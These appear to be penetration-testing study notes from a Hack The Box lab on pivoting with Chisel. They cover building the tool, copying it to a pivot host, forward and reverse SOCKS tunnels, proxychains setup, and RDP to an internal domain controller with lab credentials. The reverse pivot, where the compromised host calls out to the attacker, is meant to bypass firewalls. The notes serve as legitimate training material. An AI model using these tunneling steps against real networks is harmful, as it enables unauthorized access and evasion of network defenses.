- Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH.  
- Can create a client-server tunnel connection in a firewall restricted environment. 

### Setting Up Chisel
- First we need to clone chisel on to our attack host: 
```shell-session
realCustampin@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

- In order for chisel to work properly however, we need to have the programming language installed on the system in order for us to build the binaries. 

**Building Binaries**
```shell-session
realCustampin@htb[/htb]$ cd chisel
go build
```

It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection. Two beneficial resources to complement this particular concept are Oxdf's blog post "[Tunneling with Chisel and SSF](https://0xdf.gitlab.io/cheatsheets/chisel)" and IppSec's walkthrough of the box `Reddish`. IppSec starts his explanation of Chisel, building the binary and shrinking the size of the binary at the 24:29 mark of his [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s).

**Transferring Chisel Binary to Pivot Host:**
```shell-session
realCustampin@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```

**Running the Chisel Server on the Pivot Host**
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```
- The chisel listener will listen for traffic coming over port 1234 using SOCKS5 and then forward that traffic to all hosts that are connected to the pivot host. 

**Connecting the Chisel Server**
```shell-session
realCustampin@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```
- We can see that now our socks proxy on our attack host is going to be using port 1080, which we need to make that adjustment within proxychains configuration file. 

```shell-session
realCustampin@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

**Using Proxychains and Chisel to Access DC on Internal Network**
```shell-session
realCustampin@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Chisel Reverse Pivot
- There may be some cases that the internal firewall is blocking incoming communication, in that case we can use a reverse chisel session to try and circumvent that. 

**Starting the Chisel Server on our Attack Host:**
```shell-session
realCustampin@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

**Connecting the Chisel Client to our Attack Host**
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

**Confirming the Configurations on Attack Host**
```shell-session
realCustampin@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```